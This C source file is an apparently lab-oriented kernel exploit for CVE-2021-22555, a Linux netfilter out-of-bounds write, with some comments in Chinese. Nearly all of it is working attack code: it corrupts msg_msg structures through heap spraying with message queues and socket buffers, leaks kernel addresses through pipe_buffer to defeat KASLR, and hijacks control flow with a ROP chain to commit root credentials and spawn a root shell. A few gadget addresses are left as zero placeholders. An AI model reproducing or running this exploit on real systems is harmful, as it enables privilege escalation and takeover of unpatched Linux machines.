// clang-format off
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <linux/netfilter_ipv4/ip_tables.h>
// clang-format on

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"
#define log_debug(fmt, ...) \
  dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define log_info(fmt, ...)                                              \
  dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define log_warning(fmt, ...)                                            \
  dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define log_error(fmt, ...)                                           \
  dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                       \
  do {                                      \
    log_error(fmt, ##__VA_ARGS__);          \
    log_error("Exit at line %d", __LINE__); \
    exit(1);                                \
  } while (0)

#define PAGE_SIZE 0x1000

#define MSG_QUEUE_NUM 0x1000

#define PRIMARY_SIZE 0x1000
#define PRIMARY_TYPE 0x41
#define SECONDARY_SIZE 0x400
#define SECONDARY_TYPE 0x42
#define MTYPE_FAKE 0x1337

#define MSG_TAG 0xAAAAAAAA

#define SOCKET_NUM 8
#define SK_BUFF_NUM 128

#define PIPE_NUM 0x100

// nokaslr grep /proc/kallsyms
#define ANON_PIPE_BUF_OPS 0xffffffff8223e8c0
#define PREPARE_KERNEL_CRED 0xffffffff810e0f80
#define INIT_CRED 0xffffffff82e8aee0
#define COMMIT_CREDS 0xffffffff810e0aa0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0x0
#define PUSH_RSI_POP_RSP 0x0
#define POP_RDI_RET 0x0

struct list_head {
  uint64_t next;
  uint64_t prev;
};

struct msg_msg {
  struct list_head m_list;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct {
  long mtype;
  char mtext[PRIMARY_SIZE - sizeof(struct msg_msg)];
} primary_msg;

struct {
  long mtype;
  char mtext[SECONDARY_SIZE - sizeof(struct msg_msg)];
} secondary_msg;

struct {
  long mtype;
  char mtext[PAGE_SIZE - sizeof(struct msg_msg) + PAGE_SIZE -
             sizeof(struct msg_msgseg)];
} fake_msg;

typedef struct pipe_buffer {
  uint64_t page;
  uint32_t offset, len;
  uint64_t ops;
  uint32_t flags;
  uint32_t padding;
  uint64_t private;
} pipe_buffer;

typedef struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t try_steal;
  uint64_t get;
} pipe_buf_operations;

// movq 是64位下不行
size_t user_cs, user_ss, user_eflags, user_esp;
void save_status() {
    asm(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%esp, %2\n"
        "pushf\n"
        "pop %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_esp), "=r" (user_eflags) 
        : 
        : "memory"
      );
  log_debug("status saved");
}

void get_shell() {
  if (getuid()) {
    die("\033[31m\033[1m[x] Failed to get the root!\033[0m");
  }
  puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
  puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
  system("/bin/sh");
  exit(0);
}

int make_msg_queue() { return msgget(IPC_PRIVATE, 0666 | IPC_CREAT); }

// why sub sizeof(long) => because we send msg from struct msgbuf
// rather than msgbuf.mtext
int recv_msg(int msgqid, void* msgp, uint64_t msgsz, long msgtyp) {
  return msgrcv(msgqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

int send_msg(int msgqid, void* msgp, uint64_t msgsz, long msgtyp) {
  *(long*)msgp = msgtyp;
  return msgsnd(msgqid, msgp, msgsz - sizeof(long), 0);
}

int copy_msg(int msgqid, void* msgp, uint64_t msgsz, long msgtyp) {
  return msgrcv(msgqid, msgp, msgsz - sizeof(long), msgtyp,
                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg* msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_ts, uint64_t next) {
  msg->m_list.next = m_list_next;
  msg->m_list.prev = m_list_prev;
  msg->m_type = MTYPE_FAKE;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}

int spray_sk_buff(int ss[SOCKET_NUM][2], void* buf, uint64_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < SK_BUFF_NUM; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        log_error("failed to spray %d sk_buff for %d socket!", j, i);
        return -1;
      }
    }
  }

  return 0;
}

int free_sk_buff(int ss[SOCKET_NUM][2], void* buf, uint64_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < SK_BUFF_NUM; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        puts("[x] failed to received sk_buff!");
        return -1;
      }
    }
  }

  return 0;
}

void trigger_oob_write(int socket_fd) {
  struct __attribute__((__packed__)) {
    struct ipt_replace replace;
    struct ipt_entry entry;
    struct xt_entry_match match;
    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = sizeof(data.entry) + sizeof(data.match) +
                      sizeof(data.pad) + sizeof(data.target);

  data.entry.next_offset = sizeof(data.entry) + sizeof(data.match) +
                           sizeof(data.pad) + sizeof(data.target);
  data.entry.target_offset =
      sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad);

  data.match.u.user.match_size = sizeof(data.match) + sizeof(data.pad);
  strcpy(data.match.u.user.name, "icmp");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;

  // partial overwrite the next object
  if (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)))
    if (errno == ENOPROTOOPT) die("ip_tables module is not loaded!");
}

void setup_sandbox() {
  cpu_set_t cpu_set;
  log_info("ident namespace");
  if (unshare(CLONE_NEWUSER) < 0) die("failed to unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNET) < 0) die("failed to unshare(CLONE_NEWNET)");

  log_info("process bind cpu core");
  CPU_ZERO(&cpu_set);
  CPU_SET(0, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

uint64_t kheap_addr;
uint64_t nokaslr_base = 0xffffffff81000000;
uint64_t kernel_base, kernel_offset;

int main(int argc, char** argv) {
  log_info("CVE-2021-22555");

  int socket_fd;
  int sk_sockets[SOCKET_NUM][2];
  int pipe_fd[PIPE_NUM][2];
  int msgqid[MSG_QUEUE_NUM];
  int victim_qid, real_qid;

  struct msg_msg* msg;
  struct pipe_buffer* pipe_buf_ptr;
  struct pipe_buf_operations* ops_ptr;

  char primary_buf[PRIMARY_SIZE - 0x140];
  char secondary_buf[SECONDARY_SIZE -
                     0x140];  // sk_buff 使用，因此需要减去对应的头部

  save_status();
  setup_sandbox();

  log_info("prepare socket");
  if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    die("failed to create socket!");
  }
  for (int i = 0; i < SOCKET_NUM; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0) {
      die("failed to create socketpair!");
    }
  }

  log_info("prepare msg_queue");
  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    if ((msgqid[i] = make_msg_queue()) < 0) {
      die("build msg_queue error");
    }
  }

  log_info("prepare primary_msg and secondary_msg");
  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    memset(&primary_msg, 0, sizeof(primary_msg));
    *(int*)&primary_msg.mtext[0] = MSG_TAG;
    *(int*)&primary_msg.mtext[4] = i;
    if (send_msg(msgqid[i], &primary_msg, sizeof(primary_msg), PRIMARY_TYPE) <
        0) {
      die("prepare primary_msg[%d] error", i);
    }
  }
  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    memset(&secondary_msg, 0, sizeof(secondary_msg));
    *(int*)&secondary_msg.mtext[0] = MSG_TAG;
    *(int*)&secondary_msg.mtext[4] = i;
    if (send_msg(msgqid[i], &secondary_msg, sizeof(secondary_msg),
                 SECONDARY_TYPE) < 0) {
      die("prepare secondary_msg[%d] error", i);
    }
  }

  log_info("free 1024, 2048, 3096 primary_msg");
  for (int i = 1024; i < MSG_QUEUE_NUM; i += 1024) {
    if (recv_msg(msgqid[i], &primary_msg, sizeof(primary_msg), PRIMARY_TYPE) <
        0) {
      die("error while release some primary[%d]", i);
    }
  }

  log_info("trigger oob write");
  trigger_oob_write(socket_fd);

  log_info("find the which primary_msg->next is polluted");
  victim_qid = real_qid = -1;
  // 如果主消息和辅助消息 mtext[4]
  // 不同，则表示主消息msg_msg->m_list->next成员被修改， mtext[0]
  // 检查是否正确接收到消息
  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    if ((i % 1024) == 0) {  // freed
      continue;
    }
    // why typ ?= 1，意思是第二条消息的内容。
    // 如果类型是 SECONDARY_TYPE 又怎么样？
    if (copy_msg(msgqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0) {
      die("failed to receive secondary msg! error msgqid: %d\n", i);
    }

    if (*(int*)&secondary_msg.mtext[0] != MSG_TAG) {
      die("failed to make corruption!");
    }

    if (*(int*)&secondary_msg.mtext[4] != i) {
      victim_qid = i;
      real_qid = *(int*)&secondary_msg.mtext[4];
      break;
    }
  }
  if (victim_qid < 0) {
    die("cannot find the polluted msg");
  }
  log_debug("find primary_msg 0x%x : secondary_msg 0x%x", victim_qid, real_qid);

  log_info("start construct UAF");
  if (recv_msg(msgqid[real_qid], &secondary_msg, sizeof(secondary_msg),
               SECONDARY_TYPE) < 0) {
    die("failed to receive secondary msg!");
  }

  log_info("use socket buffer heap spray");
  memset(&secondary_buf, 0, sizeof(secondary_buf));
  log_debug("build a fake msg_msg structure");
  build_msg((struct msg_msg*)secondary_buf, 0x41414141, 0x42424242,
            0x1000 - sizeof(struct msg_msg), 0);
  log_debug("many socket buffer to increase success rate");
  if (spray_sk_buff(sk_sockets, secondary_buf, sizeof(secondary_buf)) < 0) {
    // 虽然有sk_buff header，总有一个body可以得到释放的消息上
    die("error build socket buffer ");
  }
  log_debug("change msg m_ts, so we can read secondary_msg 0x1000");
  if (copy_msg(msgqid[victim_qid], &fake_msg, sizeof(fake_msg), 1) < 0) {
    die("copy msg[victim_id] to fake_msg error");
  }

  // copy content + 相邻msg_msg内容
  // header也得计算
  if (*(int*)&fake_msg.mtext[SECONDARY_SIZE] != MSG_TAG) {
    // 检查是否为相邻 msg_msg 的内容
    die("Error could not leak adjacent secondary message.\n");
  }

  msg =
      (struct msg_msg*)&fake_msg.mtext[SECONDARY_SIZE - sizeof(struct msg_msg)];
  kheap_addr = msg->m_list.next;
  if (kheap_addr & (PRIMARY_SIZE - 1)) {
    kheap_addr = msg->m_list.prev;
  }
  log_info("secondary kheap_addr: 0x%lx", kheap_addr);

  log_info("change msg_msg->next and msg->m_ts to read any address");
  // 主要修复next指针。msg_msg->next = kheap_addr，在这里是primary_msg addr
  free_sk_buff(sk_sockets, secondary_buf, sizeof(secondary_buf));
  memset(&secondary_buf, 0, sizeof(secondary_buf));
  build_msg((struct msg_msg*)secondary_buf, 0x41414141, 0x42424242,
            0x1000 - sizeof(struct msg_msg),
            kheap_addr - sizeof(struct msg_msgseg));
  if (spray_sk_buff(sk_sockets, secondary_buf, sizeof(secondary_buf)) < 0) {
    die("error build socket buffer ");
  }
  if (copy_msg(msgqid[victim_qid], &fake_msg, sizeof(fake_msg), 1) < 0) {
    die("error copy msg");
  }
  if (*(int*)&fake_msg.mtext[SECONDARY_SIZE] != MSG_TAG) {
    die("Error could not leak primary message.\n");
  }

  msg = (struct msg_msg*)&fake_msg.mtext[PAGE_SIZE - sizeof(struct msg_msgseg)];
  kheap_addr = msg->m_list.next;
  if (kheap_addr & (SECONDARY_SIZE - 1)) kheap_addr = msg->m_list.prev;
  kheap_addr -= SECONDARY_SIZE;  // primary->next = secondary_msg addr
  log_debug("kheap_addr: 0x%lx", kheap_addr);

  log_info("use pipe bypass kaslr");
  free_sk_buff(sk_sockets, secondary_buf, sizeof(secondary_msg));
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg((struct msg_msg*)secondary_buf, kheap_addr, kheap_addr, 0, 0);
  if (spray_sk_buff(sk_sockets, secondary_buf, sizeof(secondary_buf)) < 0) {
    die("error build a fake secondary msg");
  }

  log_info("Freeing msg data buffer...\n");
  if (recv_msg(msgqid[victim_qid], &fake_msg, sizeof(fake_msg), MTYPE_FAKE) <
      0) {
    die("error");
  }

  for (int i = 0; i < PIPE_NUM; i++) {
    if (pipe(pipe_fd[i]) < 0) {
      die("error create pipe [%d]", i);
    }
    if (write(pipe_fd[i][1], "pwn", 3) < 0) {
      die("error write pipe[%d]", i);
    }
  }

  log_info("leak kernel base");
  pipe_buf_ptr = (struct pipe_buffer*)&secondary_buf;
  for (int i = 0; i < SOCKET_NUM; i++) {
    for (int j = 0; j < 2; j++) {
      if (read(sk_sockets[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
        die("read sh_socket[%d][1]", i);
      }
      if (*(uint64_t*)&secondary_buf[0x10] != MTYPE_FAKE) {
        ops_ptr = *(uint64_t*)&secondary_buf[0x10];
      }
    }
  }
  kernel_offset = ops_ptr - ANON_PIPE_BUF_OPS;
  kernel_base = kernel_offset + nokaslr_base;

  log_debug("leak success\n\t\t kernel_base=0x%lx\n\t\t kernel_offset=0x%lx",
            kernel_base, kernel_offset);
  getchar();

  log_info("change ops->release to rop");

  ops_ptr->release =
      PUSH_RSI_POP_RSP + kernel_offset;  // push rsi ; pop rsp ; xxx

  uint64_t idx = 0;
  uint64_t* rop_chain = (uint64_t*)&secondary_buf[0x20];
  rop_chain[idx++] = kernel_offset + POP_RDI_RET;
  rop_chain[idx++] = kernel_offset + INIT_CRED;
  rop_chain[idx++] = kernel_offset + COMMIT_CREDS;
  rop_chain[idx++] =
      kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
  rop_chain[idx++] = *(uint64_t*)"pwn";
  rop_chain[idx++] = *(uint64_t*)"pwn";
  rop_chain[idx++] = (uint64_t)get_shell;
  rop_chain[idx++] = user_cs;
  rop_chain[idx++] = user_eflags;
  rop_chain[idx++] = user_esp;
  rop_chain[idx++] = user_ss;

  log_info("trigger pipe_buffer->ops->release to hijack rip");
  if (spray_sk_buff(sk_sockets, secondary_buf, sizeof(secondary_buf)) < 0) {
    die("failed to spray sk_buff!");
  }
  for (int i = 0; i < PIPE_NUM; i++) {
    if (close(pipe_fd[i][0]) < 0) {
      die("close pipe_fd[%d][0]", i);
    }
    if (close(pipe_fd[i][1]) < 0) {
      die("close pipe_fd[%d][0]", i);
    }
  }

  log_info("clean up the msg_queue && sk_buff?");
}
